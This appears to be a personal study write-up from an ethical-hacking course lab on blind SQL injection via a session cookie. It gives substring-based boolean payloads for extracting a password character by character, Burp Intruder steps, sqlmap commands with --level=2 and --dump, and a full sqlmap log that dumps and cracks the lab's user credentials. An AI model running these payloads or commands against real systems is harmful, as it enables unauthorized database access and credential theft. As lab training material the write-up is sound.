


```
vim req.txt
```

```
sqlmap -r req.txt
```


Methodology, if 2 parameters don't seem to be injectable then go back to the application and test other things. in this case the SQL injection was in the session cookie, think about everything supplied

extract using substring


```
' and substring('a',1,1) = 'a'#
```

The first number is the start length, the second number is the end length, I'm asking it here to check the first character only since both numbers are 1 and 1.

```
' and substring((select version()),1,1) = '8'#
```

here we are testing for what version the database is, we need to also account for the `.` since they are characters
```
' and substring((select version()),1,2) = '8.'#
' and substring((select version()),1,3) = '8.0'#
```

To extract a password now, here is what we can do

```
' and substring((select password from injection0x02 where username = 'jessamy'),1,1) = 'a'#
```

so we send this payload to intruder, set your payload in this case to be all the letters from a to z and numbers from 1 to 9. set the payload as sniper and fire off

remember to watch out for the different `length` in the results, in this case the first character we found out is going to be `z` because it had a different length. the length for it was `1310` while for everything else it was around `2247`


We can automate this too in sqlmap, to inject into cookies the flag `--level=2` is needed, `--dump` dumps ALL of the databases, `-T` specifies the TABLE i want to dump

```
sqlmap -r req.txt --level=2
sqlmap -r req.txt --level=2 --dump
sqlmap -r req.txt --level=2 --dump -T injection0x02
```

```
kali@kali ~> sqlmap -r req2.txt --level=2 --dump -T injection0x02
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.4#stable}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 06:12:33 /2024-05-17/

[06:12:33] [INFO] parsing HTTP request from 'req2.txt'
[06:12:33] [INFO] resuming back-end DBMS 'mysql'
[06:12:33] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: session (Cookie)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: session=6967cabefd763ac1a1a88e11159957db' AND 8603=8603 AND 'dtrB'='dtrB

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: session=6967cabefd763ac1a1a88e11159957db' AND (SELECT 4083 FROM (SELECT(SLEEP(5)))OrKY) AND 'iujE'='iujE
---
[06:12:33] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: PHP 7.4.33, Apache 2.4.54
back-end DBMS: MySQL >= 5.0.12
[06:12:33] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[06:12:33] [INFO] fetching current database
[06:12:33] [INFO] resumed: peh-labs
[06:12:33] [INFO] fetching columns for table 'injection0x02' in database 'peh-labs'
[06:12:33] [INFO] resumed: 4
[06:12:33] [INFO] resumed: username
[06:12:33] [INFO] resumed: password
[06:12:33] [INFO] resumed: email
[06:12:33] [INFO] resumed: session
[06:12:33] [INFO] fetching entries for table 'injection0x02' in database 'peh-labs'
[06:12:33] [INFO] fetching number of entries for table 'injection0x02' in database 'peh-labs'
[06:12:33] [INFO] resumed: 2
[06:12:33] [INFO] resumed: 6967cabefd763ac1a1a88e11159957db
[06:12:33] [INFO] resumed: jeremy@example.com
[06:12:33] [INFO] resumed: jeremy
[06:12:33] [INFO] resumed: jeremy
[06:12:33] [INFO] resumed: 9dedc6891e2839a791ed37157f1241fe
[06:12:33] [INFO] resumed: jessamy@example.com
[06:12:33] [INFO] resumed: ZWFzdGVyZWdn
[06:12:33] [INFO] resumed: jessamy
[06:12:33] [INFO] recognized possible password hashes in column '`session`'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[06:12:40] [INFO] writing hashes to a temporary file '/tmp/sqlmap4ju35ldw9358/sqlmaphashes-5ocgd8xa.txt'
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[06:12:42] [INFO] using hash method 'md5_generic_passwd'
[06:12:42] [INFO] resuming password 'jeremy' for hash '6967cabefd763ac1a1a88e11159957db' for user 'jeremy'
[06:12:42] [INFO] resuming password 'jessamy' for hash '9dedc6891e2839a791ed37157f1241fe' for user 'jessamy'
Database: peh-labs
Table: injection0x02
[2 entries]
+---------------------+--------------+----------+--------------------------------------------+
| email               | password     | username | session                                    |
+---------------------+--------------+----------+--------------------------------------------+
| jeremy@example.com  | jeremy       | jeremy   | 6967cabefd763ac1a1a88e11159957db (jeremy)  |
| jessamy@example.com | ZWFzdGVyZWdn | jessamy  | 9dedc6891e2839a791ed37157f1241fe (jessamy) |
+---------------------+--------------+----------+--------------------------------------------+

[06:12:42] [INFO] table '`peh-labs`.injection0x02' dumped to CSV file '/home/kali/.local/share/sqlmap/output/localhost/dump/peh-labs/injection0x02.csv'
[06:12:42] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/localhost'

[*] ending @ 06:12:42 /2024-05-17/

```

https://www.w3schools.com/sql/func_sqlserver_substring.asp